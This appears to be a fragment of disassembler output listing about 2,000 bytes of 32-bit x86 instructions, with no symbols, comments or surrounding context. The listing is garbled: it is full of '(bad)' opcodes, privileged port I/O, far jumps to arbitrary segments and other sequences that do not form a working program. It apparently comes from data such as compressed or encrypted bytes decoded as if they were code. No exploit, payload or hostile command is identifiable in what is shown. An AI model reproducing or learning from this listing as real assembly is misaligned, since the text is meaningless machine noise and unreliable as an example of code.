  4220d4:	sub    ch,0x33
  4220d7:	xchg   esp,eax
  4220d8:	sub    eax,0xb7a5085c
  4220dd:	jge    0x4220be
  4220df:	in     eax,0x7c
  4220e1:	das    
  4220e2:	pop    edx
  4220e3:	pusha  
  4220e4:	cmp    DWORD PTR [eax+0x28],ebx
  4220e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4220e8:	les    esp,FWORD PTR [ebx-0x1849a3a8]
  4220ee:	inc    ecx
  4220ef:	adc    eax,0xf90c95f0
  4220f4:	or     bl,BYTE PTR [edi-0x230a513a]
  4220fa:	fist   DWORD PTR [ecx+eiz*2+0x67ae3560]
  422101:	test   al,0xde
  422103:	enter  0x7a17,0xe5
  422107:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422108:	repnz outs dx,DWORD PTR ds:[esi]
  42210a:	dec    esi
  42210b:	jae    0x4220ea
  42210d:	sub    DWORD PTR cs:[ecx-0x25c749b8],edx
  422114:	sub    eax,0x3c45baf5
  422119:	and    edi,edx
  42211b:	jge    0x4220da
  42211d:	(bad)  
  42211e:	cmp    eax,0x5d9b8fdc
  422123:	leave  
  422124:	bound  ebp,QWORD PTR [ebx-0x35245ce6]
  42212a:	mov    ah,0x41
  42212c:	xchg   ecx,eax
  42212d:	neg    edx
  42212f:	cmp    DWORD PTR [ebp+ebx*4+0xb],0x52
  422134:	add    al,0xfc
  422136:	fmul   QWORD PTR [edx-0xcddc55f]
  42213c:	mov    ch,BYTE PTR [eax+0x60]
  42213f:	xchg   esp,eax
  422140:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422141:	ds sti 
  422143:	repz push ds
  422145:	pop    ecx
  422146:	xchg   edi,eax
  422147:	cmp    eax,0xa28bbf73
  42214c:	(bad)  
  42214d:	fistp  WORD PTR [ebx]
  42214f:	retf   
  422150:	xlat   BYTE PTR ds:[ebx]
  422151:	adc    eax,DWORD PTR [esi+edi*4]
  422154:	mov    bh,0xce
  422156:	je     0x42219c
  422158:	retf   0x996b
  42215b:	cmp    ch,BYTE PTR [edx+0x423909b3]
  422161:	mov    edi,0x1fcc3bf4
  422166:	and    al,0x76
  422168:	aas    
  422169:	inc    esi
  42216a:	add    ah,bh
  42216c:	int    0x7f
  42216e:	xchg   ebp,eax
  42216f:	xchg   esi,eax
  422170:	shl    BYTE PTR [eax-0x25aff9b3],0x59
  422177:	gs sahf 
  422179:	xor    DWORD PTR [edx+0x1f27d432],esi
  42217f:	dec    edi
  422180:	ins    DWORD PTR es:[edi],dx
  422181:	mov    edi,DWORD PTR [edx-0x5c]
  422184:	xchg   edi,eax
  422185:	sub    bh,dh
  422187:	icebp  
  422188:	inc    edx
  422189:	sub    bh,cl
  42218b:	sub    al,0x4c
  42218d:	xor    ebp,ebx
  42218f:	popf   
  422190:	pop    ecx
  422191:	ins    DWORD PTR es:[edi],dx
  422192:	popa   
  422193:	ins    DWORD PTR es:[edi],dx
  422194:	aas    
  422195:	ja     0x422156
  422197:	sbb    DWORD PTR [ebx-0x31],0xffffff88
  42219b:	dec    esi
  42219c:	jnp    0x42218d
  42219e:	pop    eax
  42219f:	les    edi,FWORD PTR [ebp+ecx*1+0x73]
  4221a3:	adc    dh,BYTE PTR [ecx-0x72]
  4221a6:	scas   al,BYTE PTR es:[edi]
  4221a7:	mov    al,ds:0x27995333
  4221ac:	loopne 0x4221a5
  4221ae:	mov    esi,0x3dc7b41
  4221b3:	iret   
  4221b4:	repz jmp 0x311781a8
  4221ba:	jo     0x422239
  4221bc:	cmp    eax,0x4b49e8f1
  4221c1:	pop    ebp
  4221c2:	mov    DWORD PTR [edi+0x64],esp
  4221c5:	enter  0x46f9,0x46
  4221c9:	mov    edx,0xcf78fe
  4221ce:	pop    edi
  4221cf:	mov    ebx,0x1c1cef1d
  4221d4:	test   eax,0x1ad5c0fa
  4221d9:	popa   
  4221da:	mov    ebx,0xdd58751
  4221df:	inc    esi
  4221e0:	in     eax,dx
  4221e1:	les    ebx,FWORD PTR [esi]
  4221e3:	pushf  
  4221e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4221e5:	inc    eax
  4221e6:	add    DWORD PTR [ebx],ecx
  4221e8:	ss inc edx
  4221ea:	mov    ebx,0x716d9ac9
  4221ef:	test   al,0x87
  4221f1:	add    al,0x52
  4221f3:	popa   
  4221f4:	pop    ebp
  4221f5:	lahf   
  4221f6:	dec    esp
  4221f7:	repz into 
  4221f9:	or     al,0xd1
  4221fb:	sub    esi,DWORD PTR [eax-0x34c7f626]
  422201:	bound  ecx,QWORD PTR [edi]
  422203:	xor    esp,eax
  422205:	cmp    bl,ch
  422207:	push   0xffeb3ecc
  42220c:	test   eax,0x779acf98
  422211:	nop
  422212:	jns    0x422276
  422214:	lods   al,BYTE PTR ds:[esi]
  422215:	in     al,0x37
  422217:	(bad)  
  422218:	out    dx,al
  422219:	cmp    BYTE PTR [esp+ebp*1+0x72],dl
  42221d:	mov    BYTE PTR [eax-0x39],ah
  422220:	xchg   esp,eax
  422221:	outs   dx,BYTE PTR ds:[esi]
  422222:	fcom   QWORD PTR [edx+ecx*2-0x3ac7ce95]
  422229:	jmp    0xffd2:0x9829deef
  422230:	repz fisubr WORD PTR ds:0x4af35f6
  422237:	mov    bl,0x15
  422239:	pop    ebp
  42223a:	aad    0xe7
  42223c:	test   eax,0x1e80001
  422241:	add    BYTE PTR [eax],al
  422243:	cld    
  422244:	(bad)  
  422245:	mov    al,ds:0x1cd852a3
  42224a:	add    DWORD PTR [edx+0x3ffb26d7],0xd
  422251:	push   0xa0b95b65
  422256:	mov    ah,0xa6
  422258:	add    DWORD PTR [edx],esp
  42225a:	jo     0x42223a
  42225c:	push   es
  42225d:	arpl   WORD PTR ds:0x7ad20219,si
  422263:	out    dx,al
  422264:	or     DWORD PTR [ebx-0x6f79de7c],esi
  42226a:	outs   dx,DWORD PTR ds:[esi]
  42226b:	ja     0x4221f7
  42226d:	xor    BYTE PTR [edi+0x7e],ah
  422270:	xor    al,0x4c
  422272:	sahf   
  422273:	mov    edx,0x73e9f1b0
  422278:	fld    TBYTE PTR ds:0xd86bb40b
  42227e:	dec    edi
  42227f:	xchg   edx,eax
  422280:	pop    ebx
  422281:	fsub   QWORD PTR [edi]
  422283:	aad    0x49
  422285:	das    
  422286:	sub    ah,BYTE PTR [eax+ebx*2-0x540c4e23]
  42228d:	xlat   BYTE PTR ds:[ebx]
  42228e:	ret    0x52c
  422291:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422292:	retf   
  422293:	mov    BYTE PTR [ecx-0x6595b566],cl
  422299:	fcmove st,st(5)
  42229b:	arpl   WORD PTR [ecx],ax
  42229d:	data16 ins BYTE PTR es:[edi],dx
  42229f:	cmp    DWORD PTR [esi-0x275b446b],edx
  4222a5:	sub    dl,ah
  4222a7:	cdq    
  4222a8:	jmp    0x3dbebbd6
  4222ad:	pop    es
  4222ae:	outs   dx,DWORD PTR ds:[esi]
  4222af:	jge    0x4222c7
  4222b1:	dec    edx
  4222b2:	js     0x42227d
  4222b4:	popa   
  4222b5:	and    bl,BYTE PTR [eax+0xb6a919b]
  4222bb:	inc    edx
  4222bc:	inc    eax
  4222bd:	ret    
  4222be:	mov    cl,0x7
  4222c0:	mov    al,ch
  4222c2:	imul   BYTE PTR [ecx]
  4222c4:	fnstcw WORD PTR [edx]
  4222c6:	stc    
  4222c7:	je     0x42233d
  4222c9:	jns    0x42231c
  4222cb:	push   esp
  4222cc:	mov    WORD PTR [ebx],ss
  4222ce:	arpl   bp,cx
  4222d0:	(bad)  [ecx]
  4222d2:	inc    ebx
  4222d3:	lahf   
  4222d4:	and    ch,ah
  4222d6:	or     eax,0x6c608335
  4222db:	jbe    0x42229e
  4222dd:	add    BYTE PTR [eax-0x45],ah
  4222e0:	dec    ecx
  4222e1:	sbb    DWORD PTR [esi+esi*1],ecx
  4222e4:	jnp    0x422329
  4222e6:	std    
  4222e7:	das    
  4222e8:	adc    BYTE PTR [ebx-0x4e43ce14],dh
  4222ee:	(bad)  
  4222f0:	bound  edx,QWORD PTR [esi]
  4222f2:	adc    al,0xf9
  4222f4:	add    cl,BYTE PTR [ebx+0x57]
  4222f7:	push   esp
  4222f8:	stc    
  4222f9:	jmp    0xf010:0x688cd97
  422300:	and    BYTE PTR [ebx+eiz*2+0x31],dh
  422304:	in     eax,dx
  422305:	aam    0x7c
  422307:	sbb    BYTE PTR [ecx+0x4d4abd5],cl
  42230d:	mov    eax,0xff063ede
  422312:	sub    DWORD PTR [edi-0x449848d9],esp
  422318:	push   ebp
  422319:	lock xor ebp,ebx
  42231c:	jns    0x422361
  42231e:	clc    
  42231f:	jge    0x422391
  422321:	sub    DWORD PTR [edx-0x6c],esi
  422324:	inc    ecx
  422325:	(bad)  
  422326:	loop   0x422315
  422328:	aam    0xb9
  42232a:	hlt    
  42232b:	and    al,0x9b
  42232d:	es push esp
  42232f:	jl     0x4222fd
  422331:	jo     0x42239a
  422333:	xchg   esi,edi
  422335:	jns    0x42238a
  422337:	add    eax,DWORD PTR [edi]
  422339:	jmp    0xbba1a69c
  42233e:	iret   
  42233f:	push   esp
  422340:	(bad)  
  422341:	or     ah,ch
  422343:	imul   esp,eax,0x50144921
  422349:	repz (bad) 
  42234b:	jmp    FWORD PTR [ebp-0x35]
  42234e:	retf   0x4073
  422351:	iret   
  422352:	add    eax,0xd04b0142
  422357:	adc    BYTE PTR [esi+0x6ed7bac7],al
  42235d:	je     0x4223bb
  42235f:	xor    esp,DWORD PTR [eax-0x78]
  422362:	mov    ebp,0xef3d45a7
  422367:	ins    DWORD PTR es:[edi],dx
  422368:	call   0x12ad:0xe4f380ee
  42236f:	mov    ds:0x1f9508a0,eax
  422374:	dec    edx
  422375:	sbb    al,BYTE PTR [ebx-0xe61eb14]
  42237b:	test   DWORD PTR [edi-0x4],edx
  42237e:	mov    ds:0x93983dcf,al
  422383:	repz repnz imul esi,DWORD PTR [ebp-0x56],0xffffff9e
  422389:	push   esi
  42238a:	jecxz  0x4223b3
  42238c:	sbb    esi,ebx
  42238e:	test   DWORD PTR [esi],eax
  422390:	imul   esp,DWORD PTR [esi],0xc1c468c8
  422396:	aaa    
  422397:	in     al,dx
  422398:	jge    0x422373
  42239a:	mov    ch,0x61
  42239c:	scas   eax,DWORD PTR es:[edi]
  42239d:	pop    esp
  42239e:	jmp    0x8725:0xcc661858
  4223a5:	or     eax,0x7f788e10
  4223aa:	push   sp
  4223ad:	adc    edi,DWORD PTR [esi+0x222b4d8b]
  4223b3:	clc    
  4223b4:	int3   
  4223b5:	jge    0x422419
  4223b7:	mov    eax,ds:0xac39a488
  4223bc:	js     0x422437
  4223be:	stos   DWORD PTR es:[edi],eax
  4223bf:	mov    ah,0xce
  4223c1:	mov    dl,0xb9
  4223c3:	adc    al,0xe4
  4223c5:	outs   dx,DWORD PTR ds:[esi]
  4223c6:	jo     0x42238a
  4223c8:	cmp    dh,BYTE PTR [ecx-0x5a47b860]
  4223ce:	psraw  mm6,QWORD PTR ss:[edi]
  4223d2:	call   0xf3bc:0xc5cc1af2
  4223d9:	mov    al,ds:0xd8ca6a07
  4223de:	sbb    ebp,DWORD PTR [ebp+ebx*4+0x2e]
  4223e2:	test   DWORD PTR [esp+esi*4],0xf9306e30
  4223e9:	xor    ebp,DWORD PTR [esi]
  4223eb:	cmp    al,0x34
  4223ed:	mov    ds:0x5b70a530,eax
  4223f2:	js     0x422424
  4223f4:	std    
  4223f5:	add    edx,DWORD PTR [eax-0x623ee622]
  4223fb:	out    0x74,eax
  4223fd:	sahf   
  4223fe:	or     eax,0x34f2e9a9
  422403:	(bad)  
  422404:	cmp    esp,DWORD PTR [esi+ebx*2]
  422407:	fcom   DWORD PTR [esi+0x79]
  42240a:	sub    eax,0x197be10b
  42240f:	sti    
  422410:	aam    0x8e
  422412:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422413:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422414:	pop    eax
  422415:	mul    esp
  422417:	daa    
  422418:	jne    0x4223b9
  42241a:	sbb    eax,DWORD PTR [ecx]
  42241c:	(bad)  
  42241d:	mov    edx,0x8a62c7aa
  422422:	(bad)  
  422423:	and    al,0x4c
  422425:	and    ah,BYTE PTR [ecx]
  422427:	xchg   esp,eax
  422428:	dec    eax
  422429:	test   DWORD PTR [ecx+0x1dcc3f4e],esp
  42242f:	std    
  422430:	(bad)  
  422431:	fistp  QWORD PTR [edi-0x11]
  422434:	loopne 0x42244c
  422436:	lods   al,BYTE PTR ds:[esi]
  422437:	mov    al,0x5d
  422439:	(bad)  
  42243a:	lock iret 
  42243c:	stos   DWORD PTR es:[edi],eax
  42243d:	add    DWORD PTR [eax],eax
  42243f:	call   0x9d422445
  422444:	arpl   WORD PTR [esi],di
  422446:	sbb    bh,BYTE PTR [edx-0x20]
  422449:	in     al,0x69
  42244b:	push   ecx
  42244c:	fcom   QWORD PTR [ebp+ebx*8+0x19d60c80]
  422453:	outs   dx,BYTE PTR ds:[esi]
  422454:	pop    edx
  422455:	aaa    
  422456:	mov    esi,0xf8bbab6b
  42245b:	adc    esi,DWORD PTR [ebp+0xe]
  42245e:	inc    ecx
  42245f:	sbb    bh,BYTE PTR [edx]
  422461:	dec    edx
  422462:	out    0x18,eax
  422464:	pop    edx
  422465:	pop    edx
  422466:	xchg   edi,eax
  422467:	dec    ebp
  422468:	cmp    edi,ecx
  42246a:	mov    ds:0xa02ca397,al
  42246f:	mov    dl,BYTE PTR [edx+0x448eb9f8]
  422475:	in     eax,0x5
  422477:	daa    
  422478:	mov    al,ds:0x2bedc553
  42247d:	ins    DWORD PTR es:[edi],dx
  42247e:	test   eax,0x74f47b31
  422483:	out    dx,al
  422484:	sub    DWORD PTR [eax-0x69785e22],esi
  42248a:	pop    eax
  42248b:	test   BYTE PTR [ebx],ch
  42248d:	(bad)  
  42248f:	cmp    al,0xd6
  422491:	sbb    eax,0xa5f3abc3
  422496:	sar    ebp,0x80
  422499:	ins    BYTE PTR es:[edi],dx
  42249a:	mov    al,ds:0x9f4fccc0
  42249f:	sbb    al,BYTE PTR [edx-0x7e]
  4224a2:	sahf   
  4224a3:	(bad)  
  4224a4:	out    dx,al
  4224a5:	mov    ecx,0xfd853319
  4224aa:	fld    TBYTE PTR [edx]
  4224ac:	rcr    BYTE PTR [edx-0x56799f79],cl
  4224b2:	stos   BYTE PTR es:[edi],al
  4224b3:	in     eax,dx
  4224b4:	jl     0x4224ea
  4224b6:	inc    eax
  4224b7:	mov    esp,0x962d1751
  4224bc:	xchg   ebx,eax
  4224bd:	or     BYTE PTR [esp+eax*4-0x64],0x82
  4224c2:	xchg   ecx,eax
  4224c3:	pop    ss
  4224c4:	push   esp
  4224c5:	je     0x422512
  4224c7:	xchg   dh,ch
  4224c9:	mov    al,0x33
  4224cb:	mov    bl,0x60
  4224cd:	and    al,0xf8
  4224cf:	shrd   DWORD PTR [eax+0x52],esi,cl
  4224d3:	stc    
  4224d4:	mov    ah,BYTE PTR [ebp+0x25598946]
  4224da:	mov    ch,0xeb
  4224dc:	inc    edi
  4224dd:	mov    ch,0x91
  4224df:	test   bh,bl
  4224e1:	jle    0x422477
  4224e3:	cmc    
  4224e4:	or     BYTE PTR [eax+0x2b],al
  4224e7:	dec    edi
  4224e8:	add    al,0xb7
  4224ea:	mov    eax,0x34feb2d
  4224ef:	jns    0x4224d2
  4224f1:	mov    al,ds:0x8208684a
  4224f6:	pop    esi
  4224f7:	retf   
  4224f8:	mov    ds:0xaa7438db,al
  4224fd:	in     eax,0x3a
  4224ff:	into   
  422500:	retf   
  422501:	mov    WORD PTR [esi],gs
  422503:	inc    ecx
  422504:	mov    eax,0x4d822744
  422509:	xor    al,0xe8
  42250b:	aad    0x4b
  42250d:	retf   0x326e
  422510:	cmp    bl,BYTE PTR [ebp+0x23]
  422513:	or     edx,DWORD PTR [ecx+0x74229f07]
  422519:	(bad)  
  42251a:	mov    edi,0x759e92a
  42251f:	pop    edi
  422520:	dec    esp
  422521:	sbb    DWORD PTR [eax+edi*4],eax
  422524:	inc    ecx
  422525:	add    DWORD PTR [esi+0x74],esi
  422528:	sti    
  422529:	retf   
  42252a:	or     DWORD PTR [esi],edx
  42252c:	or     BYTE PTR [ecx-0x7b883cbc],cl
  422532:	stos   BYTE PTR es:[edi],al
  422533:	jp     0x42254f
  422535:	clc    
  422536:	pop    ebp
  422537:	or     BYTE PTR [ebp+0x42694edf],dl
  42253d:	mov    al,0x39
  42253f:	mov    esi,DWORD PTR [ebp+0xb]
  422542:	mov    ebp,esp
  422544:	cmp    al,0x71
  422546:	sti    
  422547:	rcl    al,1
  422549:	call   0x3aff03aa
  42254e:	jne    0x4224fe
  422550:	xchg   edx,eax
  422551:	out    0x6,al
  422553:	xor    cl,BYTE PTR [eax]
  422555:	mov    esp,0xbfb0d361
  42255a:	ror    cl,1
  42255c:	xlat   BYTE PTR ds:[ebx]
  42255d:	fwait
  42255e:	lock jg 0x4224fe
  422561:	lds    edx,FWORD PTR [eax-0x6e]
  422564:	mov    dl,0xe3
  422566:	xlat   BYTE PTR ds:[ebx]
  422567:	pop    ecx
  422568:	retf   0x7a6e
  42256b:	aaa    
  42256c:	push   es
  42256d:	jo     0x4225df
  42256f:	jp     0x422523
  422571:	jns    0x422592
  422573:	bswap  ebx
  422575:	mov    edx,0x6c964bcf
  42257a:	jne    0x4225f7
  42257c:	push   edx
  42257d:	xchg   DWORD PTR [esi],edi
  42257f:	pop    ss
  422580:	mov    bh,0xab
  422582:	xchg   edi,eax
  422583:	mov    cl,BYTE PTR [esi-0x32]
  422586:	and    eax,0xa4e0a122
  42258b:	mov    eax,ds:0x2c617280
  422590:	add    eax,0xee0e9bfe
  422595:	mov    edx,0x16de3d8c
  42259a:	out    0x27,al
  42259c:	jne    0x4225b5
  42259e:	mov    dh,0xb
  4225a0:	jae    0x4225be
  4225a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225a3:	cmc    
  4225a4:	je     0x422548
  4225a6:	dec    eax
  4225a7:	clc    
  4225a8:	or     edx,ecx
  4225aa:	mov    ebx,0x8a98a261
  4225af:	je     0x4225a5
  4225b1:	fld    DWORD PTR [ebp+0x5]
  4225b4:	xor    BYTE PTR [eax],ah
  4225b6:	jns    0x4225f1
  4225b8:	pop    es
  4225b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4225ba:	and    al,bh
  4225bc:	add    al,0x43
  4225be:	pop    eax
  4225bf:	(bad)  
  4225c1:	mul    ebp
  4225c3:	mov    WORD PTR [edi],?
  4225c5:	sbb    bh,BYTE PTR [ebx+0x5106d372]
  4225cb:	popf   
  4225cc:	mov    edi,esi
  4225ce:	mov    edi,esp
  4225d0:	jecxz  0x4225b0
  4225d2:	xlat   BYTE PTR ds:[ebx]
  4225d3:	cmp    ch,BYTE PTR [eax]
  4225d5:	sbb    al,0xdf
  4225d7:	jnp    0x422603
  4225d9:	sbb    al,0x8f
  4225db:	idiv   DWORD PTR [ecx-0x1b]
  4225de:	dec    edx
  4225df:	ja     0x422589
  4225e1:	mul    DWORD PTR [edi-0x4d070652]
  4225e7:	out    0x6d,eax
  4225e9:	cmp    BYTE PTR [edx-0x77975f11],0x5b
  4225f0:	fs jno 0x422589
  4225f3:	sar    DWORD PTR [edx+0x2],cl
  4225f6:	mov    al,ds:0x61ce4703
  4225fb:	adc    BYTE PTR [esi-0x2e71025f],bh
  422601:	push   ecx
  422602:	js     0x422683
  422604:	dec    esi
  422605:	push   cs
  422606:	arpl   WORD PTR [edi-0x21],di
  422609:	mov    al,0xc4
  42260b:	aam    0x7
  42260d:	call   FWORD PTR [esi+0x54969632]
  422613:	sti    
  422614:	ret    
  422615:	push   ecx
  422616:	(bad)  
  422617:	and    al,0x82
  422619:	lds    edi,FWORD PTR [ebx+0x3c]
  42261c:	pop    ds
  42261d:	pop    ecx
  42261e:	dec    ecx
  42261f:	sub    bl,ch
  422621:	scas   al,BYTE PTR es:[edi]
  422622:	fucom  st(1)
  422624:	call   0x18f7111d
  422629:	push   edx
  42262a:	mov    ecx,0x35f6a91e
  42262f:	idiv   DWORD PTR [edi-0x21]
  422632:	stos   DWORD PTR es:[edi],eax
  422633:	(bad)  
  422634:	daa    
  422635:	popa   
  422636:	mov    al,ds:0xa406d770
  42263b:	mov    bh,0xad
  42263d:	add    DWORD PTR [eax],eax
  42263f:	call   0x2422645
  422644:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  422646:	fbld   TBYTE PTR [edi+eiz*4-0x3011cbb4]
  42264d:	lock lods al,BYTE PTR ds:[esi]
  42264f:	ds add dl,cl
  422652:	je     0x42267e
  422654:	ss adc eax,0x139e1ee6
  42265a:	and    al,0x66
  42265c:	es out dx,al
  42265e:	inc    ebx
  42265f:	(bad)  
  422660:	adc    cl,BYTE PTR [edi-0x5e]
  422663:	retf   
  422664:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422665:	mov    ecx,0x99cf0911
  42266a:	sbb    eax,0xea0e8149
  42266f:	pop    edx
  422670:	jne    0x422667
  422672:	out    0x4d,al
  422674:	mov    WORD PTR ds:0xe58d58ef,?
  42267a:	jb     0x4226bb
  42267c:	mov    edx,0x68918916
  422681:	mov    al,0x23
  422683:	push   ss
  422684:	lock dec ebp
  422686:	cwde   
  422687:	nop
  422688:	sti    
  422689:	add    ebp,eax
  42268b:	pop    esp
  42268c:	sbb    cl,BYTE PTR [esi+0x7f0b9dc2]
  422692:	fxch   st(6)
  422694:	pop    eax
  422695:	jnp    0x422643
  422697:	jo     0x4226d6
  422699:	xor    DWORD PTR [ebp-0x62],esp
  42269c:	mov    eax,ds:0x4c4bf8ba
  4226a1:	imul   esi,DWORD PTR [ebx+0x1c1f6e68],0xc2fdf782
  4226ab:	ret    
  4226ac:	fwait
  4226ad:	loopne 0x42263c
  4226af:	cmp    edx,ecx
  4226b1:	jnp    0x42271c
  4226b3:	sbb    dh,cl
  4226b5:	push   0xffffffa2
  4226b7:	adc    DWORD PTR [ebx],esi
  4226b9:	gs pop ss
  4226bb:	je     0x42272b
  4226bd:	gs ins DWORD PTR es:[edi],dx
  4226bf:	aam    0xaf
  4226c1:	adc    ebx,DWORD PTR [eax]
  4226c3:	pushf  
  4226c4:	mov    ebp,0x70a26c67
  4226c9:	jecxz  0x42271f
  4226cb:	inc    ebp
  4226cc:	repz fsubr DWORD PTR [edx+edi*1]
  4226d0:	sbb    BYTE PTR [edi-0x34f5e716],al
  4226d6:	in     al,dx
  4226d7:	cmc    
  4226d8:	test   al,0x27
  4226da:	push   eax
  4226db:	mov    ds:0x8c5e1d4a,eax
  4226e0:	sti    
  4226e1:	jb     0x42274e
  4226e3:	xor    al,0x5
  4226e5:	outs   dx,DWORD PTR ds:[esi]
  4226e6:	scas   al,BYTE PTR es:[edi]
  4226e7:	fadd   st,st(6)
  4226e9:	lods   al,BYTE PTR ds:[esi]
  4226ea:	mov    dl,0x28
  4226ec:	xchg   DWORD PTR [edi+0x7c944b0c],edi
  4226f2:	fmul   QWORD PTR [ecx+ebp*1]
  4226f5:	sar    DWORD PTR ds:0xd035fbd9,1
  4226fb:	retf   
  4226fc:	lahf   
  4226fd:	popa   
  4226fe:	push   es
  4226ff:	lea    edi,[ecx+edx*8]
  422702:	dec    ecx
  422703:	lods   eax,DWORD PTR ds:[esi]
  422704:	jecxz  0x422762
  422706:	inc    esi
  422707:	outs   dx,DWORD PTR ds:[esi]
  422708:	adc    DWORD PTR [ebx+edi*4-0x20],esp
  42270c:	sar    ecx,1
  42270e:	pop    edi
  42270f:	xchg   BYTE PTR [ebx+edi*2-0x72],ah
  422713:	mov    si,0x678e
  422717:	in     al,dx
  422718:	adc    ch,BYTE PTR [esi+0x15a8da3a]
  42271e:	pushf  
  42271f:	and    eax,0x50c35860
  422724:	and    DWORD PTR [edi+edi*2+0x56],edi
  422728:	repnz inc ecx
  42272a:	outs   dx,BYTE PTR ds:[esi]
  42272b:	out    dx,eax
  42272c:	lahf   
  42272d:	in     al,dx
  42272e:	lods   eax,DWORD PTR ds:[esi]
  42272f:	jp     0x4226e0
  422731:	or     al,0x2d
  422733:	popf   
  422734:	fisub  WORD PTR [edx]
  422736:	dec    ecx
  422737:	ret    
  422738:	shr    DWORD PTR [ebp-0x7c6167c4],1
  42273e:	out    dx,eax
  42273f:	push   ebx
  422740:	sub    ecx,0xb052d664
  422746:	cmp    BYTE PTR [edi+0x66],al
  422749:	lock fs dec ecx
  42274c:	in     al,dx
  42274d:	dec    edi
  42274e:	jb     0x42274b
  422750:	and    eax,0x597dc571
  422755:	icebp  
  422756:	arpl   di,si
  422758:	call   0x1dd86996
  42275d:	jb     0x42278c
  42275f:	sbb    BYTE PTR [ebx],0x73
  422762:	fsubr  DWORD PTR [edi+edx*4]
  422765:	(bad)
  422768:	jle    0x422706
  42276a:	cmp    al,0x75
  42276c:	ins    BYTE PTR es:[edi],dx
  42276d:	mov    esp,0x6b4badcc
  422772:	jecxz  0x4227a0
  422774:	call   0xaddd7f49
  422779:	aam    0x28
  42277b:	adc    eax,0xd7830922
  422780:	cli    
  422781:	sub    BYTE PTR [ebx],dh
  422783:	and    BYTE PTR [ecx+ebp*4],dl
  422786:	pop    edx
  422787:	pop    ebx
  422788:	xor    DWORD PTR [ebp+0x41],edi
  42278b:	int    0x6a
  42278d:	xchg   BYTE PTR [edx+eiz*4+0x19b22a56],ah
  422794:	pop    ecx
  422795:	fidivr DWORD PTR [ecx-0x2c660fe9]
  42279b:	aas    
  42279c:	dec    esi
  42279d:	retf   0xec33
  4227a0:	push   0x4cae7caa
  4227a5:	pushf  
  4227a6:	cmp    DWORD PTR [edx-0x6b],edx
  4227a9:	test   ah,0xec
  4227ac:	mov    dh,0x62
  4227ae:	icebp  
  4227af:	aad    0x6c
  4227b1:	or     eax,0x89006f43
  4227b6:	jns    0x4227bf
  4227b8:	(bad)  
  4227b9:	call   0x24b5e5f0
  4227be:	jle    0x4227f2
  4227c0:	es (bad) 
  4227c2:	test   DWORD PTR [edi],ecx
  4227c4:	mov    eax,0xfea60b31
  4227c9:	sub    esp,DWORD PTR [ecx+0x7fd75067]
  4227cf:	imul   edi,ebp,0xd0f032c0
  4227d5:	xchg   edx,eax
  4227d6:	lahf   
  4227d7:	push   edx
  4227d8:	dec    esp
  4227d9:	mov    ah,0x9
  4227db:	pop    si
  4227dd:	mov    ah,al
  4227df:	lea    eax,[edx+0x45]
  4227e2:	sub    al,0x30
  4227e4:	scas   eax,DWORD PTR es:[edi]
  4227e5:	dec    eax
  4227e6:	ffree  st(7)
  4227e8:	lods   eax,DWORD PTR ds:[esi]
  4227e9:	sar    DWORD PTR ds:0xa3dd4bc8,1
  4227ef:	retf   
  4227f0:	inc    esp
  4227f1:	das    
  4227f2:	adc    BYTE PTR [esi-0x75],ch
  4227f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4227f6:	rcr    DWORD PTR [ebp+ebx*2-0x2b],cl
  4227fa:	pop    esi
  4227fb:	pop    ebx
  4227fc:	mov    DWORD PTR [ecx-0x6f],edx
  4227ff:	xor    DWORD PTR [ecx],eax
  422801:	push   edx
  422802:	sbb    bl,BYTE PTR [edi]
  422804:	pop    ds
  422805:	jns    0x42283f
  422807:	and    al,0x41
  422809:	test   al,0x70
  42280b:	aad    0xb7
  42280d:	loope  0x42282e
  42280f:	push   esi
  422810:	cld    
  422811:	xlat   BYTE PTR ds:[ebx]
  422812:	jmp    0x6a7b:0xe74ff8d
  422819:	or     eax,0x36fff4c3
  42281e:	pusha  
  42281f:	jg     0x4227a9
  422821:	js     0x4227c2
  422823:	xchg   ebp,eax
  422824:	dec    ebp
  422825:	or     DWORD PTR [edx],0xfffffff8
  422828:	dec    ebp
  422829:	jl     0x42287a
  42282b:	fwait
  42282c:	loope  0x42289b
  42282e:	sub    eax,0xf7dbad7f
  422833:	sar    BYTE PTR [ebx],cl
  422835:	(bad)  
  422836:	add    BYTE PTR [edx],ch
  422838:	call   0x1:0xaf9f329e
  42283f:	call   0xca422845
  422844:	ja     0x4228ab
  422846:	imul   eax,DWORD PTR [ecx],0x2cce360
  42284c:	shl    BYTE PTR gs:[edi],1
  42284f:	jne    0x4228b2
  422851:	outs   dx,DWORD PTR ds:[esi]
  422852:	clc    
  422853:	adc    BYTE PTR [edx-0x3eb44fd8],ch
  422859:	dec    esp
  42285a:	jmp    0xdacb9b5e
  42285f:	aad    0xc6
  422861:	push   edx
  422862:	mov    eax,ds:0xcf02bddd
  422867:	test   al,0x51
  422869:	mov    WORD PTR [ebx+eiz*4-0x56],?
  42286d:	pushf  
  42286e:	xchg   ecx,eax
  42286f:	cmp    esi,ebx
  422871:	lea    eax,[ecx+ecx*4-0x1d092d36]
  422878:	ins    DWORD PTR es:[edi],dx
  422879:	mov    eax,ds:0x549de749
  42287e:	adc    ebx,ecx
  422880:	xor    bl,BYTE PTR [ebx+edi*1]
  422883:	popf   
  422884:	xchg   ecx,eax
  422885:	mov    WORD PTR [esi],cs
  422887:	in     eax,dx
  422888:	push   esp
  422889:	out    0xe1,al
  42288b:	push   ebx
  42288c:	inc    esi
  42288d:	and    eax,0x9876187d
  422892:	jmp    0x422899
  422894:	mov    eax,ds:0x2b13cb87
  422899:	rol    DWORD PTR [eax+edx*4],1
  42289c:	(bad)  
  42289d:	adc    ebp,DWORD PTR [esi-0x16c1a10e]
  4228a3:	ja     0x4228b6
  4228a5:	(bad)  
  4228a6:	scas   al,BYTE PTR es:[edi]
  4228a7:	(bad)  
  4228a8:	mov    BYTE PTR [ebx],bl
  4228aa:	imul   cl
  4228ac:	das    
  4228ad:	jle    0x42286a
